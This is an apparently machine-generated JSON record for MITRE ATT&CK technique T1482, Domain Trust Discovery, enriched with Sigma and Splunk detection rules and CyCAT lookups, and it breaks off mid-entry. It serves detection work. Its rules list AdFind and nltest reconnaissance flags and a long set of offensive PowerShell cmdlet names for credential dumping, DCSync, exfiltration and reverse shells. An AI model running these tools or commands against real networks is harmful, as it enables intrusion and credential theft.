{
    "id": "T1482",
    "name": "Domain Trust Discovery",
    "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](T1134.005), [Pass the Ticket](T1550.003), and [Kerberoasting](T1558.003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
    "platforms": "Windows",
    "kill_chain_phases": "Discovery",
    "data_sources": "Process: Process Creation, Command: Command Execution, Process: OS API Execution, Script: Script Execution",
    "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](T1059.001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](T1482).(Citation: Microsoft GetAllTrustRelationships)",
    "url": "https://attack.mitre.org/techniques/T1482",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1482",
                "atomic_attack_guid": "ea1b4f2d-5b82-4006-b64f-f2845608a3bf",
                "atomic_attack_name": "TruffleSnout - Listing AD Infrastructure",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "Windows Command and Scripting Interpreter Hunting Path Traversal",
                        "rule_link": "https://research.splunk.com/endpoint/d0026380-b3c4-4da0-ac8e-02790063ff6b/"
                    }
                ]
            },
            {
                "tech_id": "T1482",
                "atomic_attack_guid": "d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec",
                "atomic_attack_name": "Adfind - Enumerate Active Directory OUs",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PUA - AdFind Suspicious Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows AdFind Exe",
                        "rule_link": "https://research.splunk.com/endpoint/bd3b0187-189b-46c0-be45-f52da2bae67f/"
                    }
                ]
            },
            {
                "tech_id": "T1482",
                "atomic_attack_guid": "15fe436d-e771-4ff3-b655-2dca9ba52834",
                "atomic_attack_name": "Adfind - Enumerate Active Directory Trusts",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PUA - AdFind Suspicious Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml",
                        "remote_content": "title: PUA - AdFind Suspicious Execution\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nrelated:\n    - id: 455b9d50-15a1-4b99-853f-8d37655a4c1b\n      type: similar\n    - id: 75df3b17-8bcc-4565-b89b-c9898acef911\n      type: obsolete\nstatus: test\ndescription: Detects AdFind execution with common flags seen used during attacks\nreferences:\n    - https://www.joeware.net/freetools/tools/adfind/\n    - https://thedfirreport.com/2020/05/08/adfind-recon/\n    - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n    - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72, oscd.community\ndate: 2021-02-02\nmodified: 2023-03-05\ntags:\n    - attack.discovery\n    - attack.t1018\n    - attack.t1087.002\n    - attack.t1482\n    - attack.t1069.002\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'domainlist'\n            - 'trustdmp'\n            - 'dcmodes'\n            - 'adinfo'\n            - ' dclist '\n            - 'computer_pwdnotreqd'\n            - 'objectcategory='\n            - '-subnets -f'\n            - 'name=\"Domain Admins\"'\n            - '-sc u:'\n            - 'domainncs'\n            - 'dompol'\n            - ' oudmp '\n            - 'subnetdmp'\n            - 'gpodmp'\n            - 'fspdmp'\n            - 'users_noexpire'\n            - 'computers_active'\n            - 'computers_pwdnotreqd'\n    condition: selection\nfalsepositives:\n    - Legitimate admin activity\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1482",
                "atomic_attack_guid": "2e22641d-0498-48d2-b9ff-c71e496ccdbe",
                "atomic_attack_name": "Windows - Discover domain trusts with nltest",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Recon Activity Via Nltest.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml",
                        "remote_content": "title: Potential Recon Activity Via Nltest.EXE\nid: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\nrelated:\n    - id: 410ad193-a728-4107-bc79-4419789fcbf8\n      type: similar\n    - id: 903076ff-f442-475a-b667-4f246bcc203b\n      type: similar\n    - id: 77815820-246c-47b8-9741-e0def3f57308\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)\n    - https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/\n    - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\n    - https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n    - https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html\n    - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/\n    - https://github.com/redcanaryco/atomic-red-team/blob/5360c9d9ffa3b25f6495f7a16e267b719eba2c37/atomics/T1482/T1482.md#atomic-test-2---windows---discover-domain-trusts-with-nltest\nauthor: Craig Young, oscd.community, Georg Lauenstein\ndate: 2021-07-24\nmodified: 2023-12-15\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_nltest:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    selection_recon:\n        - CommandLine|contains|all:\n              - 'server'\n              - 'query'\n        - CommandLine|contains:\n              - '/user'\n              - 'all_trusts' # Flag for /domain_trusts\n              - 'dclist:'\n              - 'dnsgetdc:'\n              - 'domain_trusts'\n              - 'dsgetdc:'\n              - 'parentdomain'\n              - 'trusted_domains'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration use but user and host must be investigated\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Nltest.EXE Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_execution.yml",
                        "remote_content": "title: Nltest.EXE Execution\nid: 903076ff-f442-475a-b667-4f246bcc203b\nrelated:\n    - id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\n      type: similar\n    - id: eeb66bbb-3dde-4582-815a-584aee9fe6d1\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\nauthor: Arun Chauhan\ndate: 2023-02-03\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1018\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activity\nlevel: low\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                    "159b4ee4-8fa1-44a5-b095-2973f3c7e25e",
                    "767dbf9e-df3f-45cb-8998-4903ab5f80c0",
                    "5d9b5933-964c-433c-b84f-4c680a2fe004",
                    "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                    "02773bed-83bf-469f-b7ff-e676e7d78bab",
                    "9a132afa-654e-11eb-ae93-0242ac130002",
                    "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                    "5cc90652-4cbd-4241-aa3b-4b462fa5a248",
                    "a21bcd7e-38ec-49ad-b69a-9ea17e69509e",
                    "77815820-246c-47b8-9741-e0def3f57308",
                    "02030f2f-6199-49ec-b258-ea71b07e03dc",
                    "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
                    "eeb66bbb-3dde-4582-815a-584aee9fe6d1",
                    "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
                    "410ad193-a728-4107-bc79-4419789fcbf8",
                    "69ca006d-b9a9-47f5-80ff-ecd4d25d481a",
                    "31d68132-4038-47c7-8f8e-635a39a7c174",
                    "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                    "3bad990e-4848-4a78-9530-b427d854aac0",
                    "75df3b17-8bcc-4565-b89b-c9898acef911",
                    "5e55be1a-3a30-48ae-9934-4199950d210f",
                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc"
                ],
                "lookup_results": [
                    {
                        "uuid": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Sean Metcalf, Florian Roth, Bartlomiej Czyz @bczyz1, oscd.community, Nasreddine\n  Bencherchali, Tim Shelton, Mustafa Kaan Demir, Georg Lauenstein, Max Altgelt, Tobias\n  Michalski, Austin Songer\ndate: 2017/03/05\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_1:\n    ScriptBlockText|contains:\n    - Get-SystemDriveInfo\n    - C:\\ProgramData\\Amazon\\EC2-Windows\\Launch\\Module\\\n  filter_2:\n    ScriptBlockText|startswith: '# Copyright 2016 Amazon.com, Inc. or its affiliates.\n      All Rights Reserved'\n  selection:\n    ScriptBlockText|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\n- id: 6d3f1399-a81c-4409-aff3-1ecfe9330baf\n  type: obsoletes\n- id: 83083ac6-1816-4e76-97d7-59af9a9ae46e\n  type: obsoletes\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ScriptBlock\n",
                            "sigma:id": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                            "title": "Malicious PowerShell Commandlets - ScriptBlock",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "159b4ee4-8fa1-44a5-b095-2973f3c7e25e",
                        "lookup_data": {
                            "mitre-attack-id": "T1482",
                            "mitre-cti:description": "Map the trusts within existing domains/forests and keep trust relationships to a minimum. Employ network segmentation for sensitive domains.(Citation: Harmj0y Domain Trusts)",
                            "mitre-cti:name": "Domain Trust Discovery Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--159b4ee4-8fa1-44a5-b095-2973f3c7e25e', 'type': 'course-of-action', 'created': '2019-02-15T13:04:25.150Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'external_id': 'T1482', 'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/mitigations/T1482'}, {'source_name': 'Harmj0y Domain Trusts', 'url': 'http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/', 'description': 'Schroeder, W. (2017, October 30). A Guide to Attacking Domain Trusts. Retrieved February 14, 2019.'}], 'modified': '2020-09-17T18:26:17.815Z', 'name': 'Domain Trust Discovery Mitigation', 'description': 'Map the trusts within existing domains/forests and keep trust relationships to a minimum. Employ network segmentation for sensitive domains.(Citation: Harmj0y Domain Trusts)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "767dbf9e-df3f-45cb-8998-4903ab5f80c0",
                        "lookup_data": {
                            "mitre-attack-id": "T1482",
                            "mitre-cti:description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
                            "mitre-cti:name": "Domain Trust Discovery",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Dave Westgard', 'Elia Florio, Microsoft', 'Mnemonic', 'RedHuntLabs, @redhuntlabs', 'ExtraHop'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0', 'created': '2019-02-14T16:15:05.974Z', 'x_mitre_version': '1.2', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1482', 'url': 'https://attack.mitre.org/techniques/T1482'}, {'source_name': 'Microsoft Operation Wilysupply', 'url': 'https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/', 'description': 'Florio, E.. (2017, May 4). Windows Defender ATP thwarts Operation WilySupply software supply chain cyberattack. Retrieved February 14, 2019.'}, {'source_name': 'AdSecurity Forging Trust Tickets', 'url': 'https://adsecurity.org/?p=1588', 'description': 'Metcalf, S. (2015, July 15). It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts. Retrieved February 14, 2019.'}, {'source_name': 'Microsoft Trusts', 'url': 'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)', 'description': 'Microsoft. (2009, October 7). Trust Technologies. Retrieved February 14, 2019.'}, {'source_name': 'Microsoft GetAllTrustRelationships', 'url': 'https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships', 'description': 'Microsoft. (n.d.). Domain.GetAllTrustRelationships Method. Retrieved February 14, 2019.'}, {'source_name': 'Harmj0y Domain Trusts', 'url': 'https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944', 'description': 'Schroeder, W. (2017, October 30). A Guide to Attacking Domain Trusts. Retrieved February 14, 2019.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)', 'modified': '2022-06-16T19:18:22.305Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Domain Trust Discovery', 'x_mitre_detection': 'System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\\n', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}], 'x_mitre_is_subtechnique': False, 'x_mitre_data_sources': ['Process: Process Creation', 'Command: Command Execution', 'Network Traffic: Network Traffic Content', 'Script: Script Execution', 'Process: OS API Execution'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5d9b5933-964c-433c-b84f-4c680a2fe004",
                        "lookup_data": {
                            "description": "Emotet in Depth TTP 10-07-19",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d9b5933-964c-433c-b84f-4c680a2fe004.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1621850615",
                            "uuid": "5d9b5933-964c-433c-b84f-4c680a2fe004",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                        "lookup_data": {
                            "description": "Trickbot to Ryuk in Two Hours",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e78dc2c-afc8-411f-94a5-40bb950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1585237597",
                            "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "02773bed-83bf-469f-b7ff-e676e7d78bab",
                        "lookup_data": {
                            "description": "Detects default file names outputted by the BloodHound collection tool SharpHound",
                            "raw": "author: C.J. May\ndate: 2022/08/09\ndescription: Detects default file names outputted by the BloodHound collection tool\n  SharpHound\ndetection:\n  condition: 1 of selection*\n  selection1:\n    TargetFilename|endswith:\n    - _BloodHound.zip\n    - _computers.json\n    - _containers.json\n    - _domains.json\n    - _gpos.json\n    - _groups.json\n    - _ous.json\n    - _users.json\n  selection2:\n    TargetFilename|contains|all:\n    - BloodHound\n    - .zip\nfalsepositives:\n- Unknown\nid: 02773bed-83bf-469f-b7ff-e676e7d78bab\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/08/09\nreferences:\n- https://academy.hackthebox.com/course/preview/active-directory-bloodhound/bloodhound--data-collection\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: BloodHound Collection Files\n",
                            "sigma:id": "02773bed-83bf-469f-b7ff-e676e7d78bab",
                            "title": "BloodHound Collection Files",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9a132afa-654e-11eb-ae93-0242ac130002",
                        "lookup_data": {
                            "description": "AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
